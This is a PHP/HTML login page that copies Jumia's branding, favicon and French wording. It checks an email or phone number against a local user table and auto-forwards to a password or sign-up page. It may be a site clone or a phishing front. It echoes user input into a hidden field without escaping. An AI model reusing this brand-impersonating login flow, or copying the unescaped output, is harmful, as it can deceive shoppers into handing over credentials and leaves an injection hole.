<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="stylesheet" href="../css/Accueil_banner.css">
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
</head>
<body>
            
        <?php 
        require_once 'db/db.php';
        $format_non_valide =false;
        if (isset($_POST['num_email']) && !empty($_POST['num_email'])) {
            $_POST['num_email'] = trim($_POST['num_email']);
            if (filter_var($_POST['num_email'], FILTER_VALIDATE_EMAIL)) {  
                $requet = $bd->prepare('SELECT * FROM user WHERE email=?');
                $requet->execute([$_POST['num_email']]);
            } 
            elseif (preg_match('/^\+?[1-9]\d{1,14}$/', $_POST['num_email'])) {
                $requet = $bd->prepare('SELECT * FROM user WHERE phone=?');
                $requet->execute([$_POST['num_email']]);
            } else {
                $format_non_valide=true;
            }
            if(!$format_non_valide){
                $resultat = $requet->fetch(PDO::FETCH_ASSOC); 
            
            // Vérifie si un résultat a été trouvé ,sinon il faut cree un compt
            
            $form_url = $resultat ? "connextion_mote_de_pass.php" : "new_compt_password.php";
            }
        }
        ?>
    <div class="cont_connex" style="display: flex; flex-direction: column; height: 100%; width: 480px; margin: 0 auto; min-height: 500px; max-width: 100%; font-family: Roboto, sans-serif;">
        <div style="margin-bottom: 50px;"></div>

        <div class="header" style="display: flex; align-items: center; height: 64px; justify-content: center; margin: 0 0 8px; position: relative;">
            <img class="logo" src="../images/logojum" width="69" height="67">
        </div>

        <div class="card" style="background-color: #fff; border-radius: 4px; padding: 8px 24px;">
            <form method="post" action="">
                <div style="display: block; margin-top: 12px;">
                    <div style="text-align: center; display: block;">
                        <h2 style="font-size: 20px; font-weight: bold; margin: 0;">Bienvenue chez Jumia</h2>
                        <p style="font-size: 16px; font-weight: 400; line-height: 1.5em; margin: 8px 0 16px; color: #4a4a4a; text-align: center;">
                            Saisissez votre adresse e-mail ou numéro de téléphone pour vous connecter ou créer un compte Jumia.
                        </p>
                    </div>

                    <div style="padding-top: 16px; display: flex; flex-direction: column; justify-content: center;">
                        <input class="num_email" type="text" name="num_email" placeholder="Adresse email ou numéro de téléphone*" style="border: 1px solid rgb(150, 149, 149); border-radius: 4px; outline: 0; width: 100%; height: 56px; padding-left: 15px; font-size: 16px;">
                        <?php 
                    if ($format_non_valide) {
                        echo "<p style=\"margin: 0; flex: 100%; font-size: 15px; color: red; padding-left: 10px; padding-top: 5px;\">Format incorrect</p>";
                    }
                    ?>
                        <div style="display: flex; justify-content: center;">
                            <span style="width: 90%; line-height: normal; height: 16px; font-size: 12px; padding-top: 7px;"></span>
                        </div>
                    </div>

                    <div style="margin-top: 40px;">
                        <input type="submit" value="Continuer" style="width: 100%; font-size: 16px; font-weight: bold; color: white; background-color: #f8982d; border: 0; padding: 15px 0px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5); cursor: pointer;">
                    </div>

                    <div style="margin-top: 16px; display: block; margin-bottom: 24px;">
                        <div style="margin-top: 70px;"></div>
                        <div style="width: 100%;">
                            <a href="" style="box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5); font-size: 16px; font-weight: bold; background-color: #1877f2; text-decoration: none; color: white; display: flex; width: 100%; padding: 15px 0px; border-radius: 4px; align-items: center;">
                                <img src="../images/facebookh.png" width="20" height="20" style="margin-left: 16px;">
                                <div style="width: 100%; display: flex; justify-content: center; padding-right: 17px;">Connectez-vous avec Facebook</div>
                            </a>
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <div style="padding: 8px 0; text-align: center;">
            <div class="text" style="font-size: 14px; line-height: 24px; padding: 0 24px; position: relative; text-align: center; width: 100%;">
                Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de <br>contacter notre service client.
            </div>
        </div>

        <div class="logo444" style="display: flex; justify-content: center; margin-top: 25px;">
            <img src="../images/jumi" width="90" height="17">
        </div>
    </div>

   <?php if (isset($form_url)){ ?>
    <form  id="monFormulaire" method="post" action="<?php echo $form_url; ?>" >        
         <input class="num_email" type="hidden" name="num_email" value=" <?php echo $_POST['num_email']; ?>">
    </form>

    <?php }?>
    

    <script>
        window.addEventListener('DOMContentLoaded', function() {
            document.getElementById('monFormulaire').submit();
        });
    </script>
</body>
</html>
